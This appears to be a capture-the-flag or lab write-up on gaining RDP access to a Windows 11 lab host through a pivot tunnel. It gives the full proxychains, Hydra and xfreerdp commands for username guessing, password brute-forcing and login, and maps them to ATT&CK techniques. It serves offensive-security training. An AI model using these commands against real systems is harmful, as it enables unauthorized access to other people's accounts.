# Initial Access — WIN11 via RDP

**ATT&CK Techniques:** T1110 · T1078 · T1087

---

## Objective

Gain initial access to WIN11 as a low-privilege local user by discovering a valid username and brute-forcing RDP credentials through the pivot tunnel.

---

## Environment

| Property | Value |
|---|---|
| Target | WIN11 — 192.168.60.20 |
| Access method | proxychains → SSH SOCKS proxy → LNX → WIN11 |
| Starting position | Kali with active pivot tunnel through LNX |

---

## Tools Used

- xfreerdp
- Hydra
- proxychains

---

## Steps

### 1. Confirm RDP is Accessible Through Tunnel

From Kali through the pivot tunnel:

```bash
proxychains xfreerdp /v:192.168.60.20 2>/dev/null
```

RDP login screen appeared — confirmed port 3389 is reachable through the tunnel.

---

### 2. Username Discovery (T1087)

Connected to the RDP login screen without credentials to check for previously logged-in usernames. The Windows login screen revealed no cached usernames — proceeded with common username enumeration.

Tried common local account names against RDP:
- `administrator`
- `admin`
- `labuser` ← valid
- `guest`

`labuser` was identified as a valid local account.

---

### 3. RDP Brute Force (T1110)

With `labuser` confirmed as a valid username, ran Hydra against RDP through the tunnel:

```bash
proxychains hydra -l labuser -P /usr/share/wordlists/rockyou.txt rdp://192.168.60.20 -t 4 2>/dev/null
```

Hydra discovered the password `Welcome1` — present in the rockyou.txt wordlist.

---

### 4. RDP Login as labuser (T1078)

Connected to WIN11 via RDP using discovered credentials:

```bash
proxychains xfreerdp /u:labuser /p:Welcome1 /v:192.168.60.20 2>/dev/null
```

RDP session established as `labuser` — low-privilege local user, not in Administrators group.

---

### 5. User Flag

```powershell
type C:\Users\labuser\Desktop\user.txt
```

**Output:**
```
user{rdp_smb_labuser_compromised}
```

---

## ATT&CK Mapping

| Technique ID | Name | Description |
|---|---|---|
| T1087 | Account Discovery | Enumerated common local usernames against RDP login screen |
| T1110 | Brute Force | Hydra brute-forced RDP with rockyou.txt wordlist, discovered labuser:Welcome1 |
| T1078 | Valid Accounts | Used discovered credentials to establish RDP session as labuser |

---

## Key Takeaways

- RDP exposed on an internal network with weak credentials is extremely common — always brute-force RDP when port 3389 is open
- `Welcome1`, `Password1`, `Summer2024` and similar "complexity-compliant but weak" passwords appear consistently in rockyou.txt
- Proxychains + xfreerdp is a reliable combination for RDP through a SOCKS tunnel — more reliable than nmap through the same tunnel
- Low-privilege initial access is still valuable — it's the foothold needed to enumerate the local machine for PE vectors
